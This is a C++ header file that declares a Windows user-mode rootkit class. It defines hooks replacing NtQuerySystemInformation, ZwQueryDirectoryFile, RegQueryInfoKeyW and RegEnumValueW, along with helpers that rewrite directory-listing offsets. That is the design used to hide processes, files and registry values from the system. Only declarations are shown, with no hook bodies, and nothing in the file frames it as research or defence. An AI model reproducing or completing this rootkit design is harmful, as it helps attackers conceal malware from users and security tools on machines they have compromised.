class Rootkit
{
public:
	static void Initialize();
	static void DebugLog(wstring str);
private:
	typedef NTSTATUS(WINAPI *NtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS systemInformationClass, SystemProcessInformationEx *systemInformation, ULONG systemInformationLength, PULONG returnLength);
	typedef NTSTATUS(*ZwQueryDirectoryFile)(HANDLE fileHandle, HANDLE event, PIO_APC_ROUTINE apcRoutine, PVOID apcContext, PIO_STATUS_BLOCK ioStatusBlock, PVOID fileInformation, ULONG length, FileInformationClassEx fileInformationClass, BOOLEAN returnSingleEntry, PUNICODE_STRING fileName, BOOLEAN restartScan);
	typedef NTSTATUS(*RegQueryInfoKeyW)(HKEY hKey, PWSTR pClass, PDWORD pcClass, PDWORD pReserved, PDWORD pcSubKeys, PDWORD pcMaxSubKeyLen, PDWORD pcMaxClassLen, PDWORD pcValues, PDWORD pcMaxValueNameLen, PDWORD pcMaxValueLen, PULONG pulSecDescLen, PFILETIME pftLastWriteTime);
	typedef NTSTATUS(*RegEnumValueW)(HKEY hKey, DWORD dwIndex, LPWSTR lpValueName, LPDWORD lpcchValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
	//typedef NTSTATUS(*RegEnumKeyExW)(HKEY hKey, DWORD dwIndex, LPWSTR lpName, LPDWORD lpcName, LPDWORD lpReserved, LPWSTR lpClass, LPDWORD lpcClass, PFILETIME lpftLastWriteTime);

	static NtQuerySystemInformation OriginalNtQuerySystemInformation;
	static ZwQueryDirectoryFile OriginalZwQueryDirectoryFile;
	static RegQueryInfoKeyW OriginalRegQueryInfoKeyW;
	static RegEnumValueW OriginalRegEnumValueW;
	//static RegEnumKeyExW OriginalRegEnumKeyExW;

	static NTSTATUS WINAPI HookedNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS systemInformationClass, SystemProcessInformationEx *systemInformation, ULONG systemInformationLength, PULONG returnLength);
	static NTSTATUS HookedZwQueryDirectoryFile(HANDLE fileHandle, HANDLE event, PIO_APC_ROUTINE apcRoutine, PVOID apcContext, PIO_STATUS_BLOCK ioStatusBlock, PVOID fileInformation, ULONG length, FileInformationClassEx fileInformationClass, BOOLEAN returnSingleEntry, PUNICODE_STRING fileName, BOOLEAN restartScan);
	static NTSTATUS HookedRegQueryInfoKeyW(HKEY hKey, PWSTR pClass, PDWORD pcClass, PDWORD pReserved, PDWORD pcSubKeys, PDWORD pcMaxSubKeyLen, PDWORD pcMaxClassLen, PDWORD pcValues, PDWORD pcMaxValueNameLen, PDWORD pcMaxValueLen, PULONG pulSecDescLen, PFILETIME pftLastWriteTime);
	static NTSTATUS HookedRegEnumValueW(HKEY hKey, DWORD dwIndex, LPWSTR lpValueName, LPDWORD lpcchValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
	//static NTSTATUS HookedRegEnumKeyExW(HKEY hKey, DWORD dwIndex, LPWSTR lpName, LPDWORD lpcName, LPDWORD lpReserved, LPWSTR lpClass, LPDWORD lpcClass, PFILETIME lpftLastWriteTime);
	static WCHAR* GetFileDirEntryFileName(PVOID fileInformation, FileInformationClassEx fileInfoClass);
	static ULONG GetFileNextEntryOffset(PVOID fileInformation, FileInformationClassEx fileInfoClass);
	static void SetFileNextEntryOffset(PVOID fileInformation, FileInformationClassEx fileInfoClass, ULONG value);
};